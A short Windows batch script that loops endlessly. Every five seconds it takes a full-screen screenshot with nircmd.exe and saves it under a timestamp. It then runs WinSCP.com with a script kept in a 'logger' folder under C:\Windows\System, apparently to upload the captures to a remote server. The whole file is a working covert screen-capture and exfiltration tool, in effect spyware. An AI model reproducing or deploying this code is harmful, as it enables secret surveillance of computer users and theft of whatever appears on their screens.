@echo off
mkdir ss
:start
SET HOUR=%time:~0,2%
SET dtStamp9=%date:~-4%%date:~4,2%%date:~7,2%_0%time:~1,1%%time:~3,2%%time:~6,2% 
SET dtStamp24=%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%
if "%HOUR:~0,1%" == " " (SET dtStamp=%dtStamp9%) else (SET dtStamp=%dtStamp24%)
nircmd.exe savescreenshotfull ss\%dtStamp%.png
C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\ss1.bat
timeout 5
goto start
